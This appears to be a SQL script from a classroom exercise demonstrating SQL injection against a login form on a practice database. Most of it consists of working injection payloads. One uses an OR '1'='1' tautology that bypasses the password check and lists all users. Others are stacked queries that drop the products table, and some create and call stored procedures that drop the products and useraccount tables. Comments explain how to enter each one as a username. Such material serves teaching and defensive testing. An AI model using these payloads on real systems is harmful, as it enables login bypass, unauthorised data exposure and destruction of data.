SELECT * FROM useraccount;
-- DELETE FROM useraccount where userid = ;

-- This query retrieves all user records and their information
SELECT * FROM useraccount WHERE username = 'zang0005' OR '1'='1';-- AND password = 'iloveoracle';

-- This query retrieves the user and drops the products table at the same time
SELECT * FROM useraccount WHERE username = 'zang0005';DROP TABLE products;-- AND password = 'iloveoracle';


-- Use this as username login to show all users. No password is needed with this command
-- zang0005' OR '1'='1';--
-- Or you can do zang0005' OR '1'='1'; but you need to enter your password too

-- Use this as username login to drop products table. No password is needed with this command
-- zang0005';DROP TABLE products;--
-- Or you can do zang0005';DROP TABLE products; but you need to enter your password too

-------------------------------------------------------------------------------------------

-- Use this to create a stored procedure containing a DROP table PRODUCTS query 
-- ilovesql');CREATE PROCEDURE sql_injection1() BEGIN DROP TABLE products;END;--

-- Call the stored procedure using this
-- zang0005';CALL sql_injection1();--

-- Use this to create a stored procedure containing a DROP TABLE USERACCOUNT query
-- ilovesql');CREATE PROCEDURE sql_injection2() BEGIN DROP TABLE useraccount;END;--

-- Call the stored procedure using this
-- zang0005';CALL sql_injection2();--
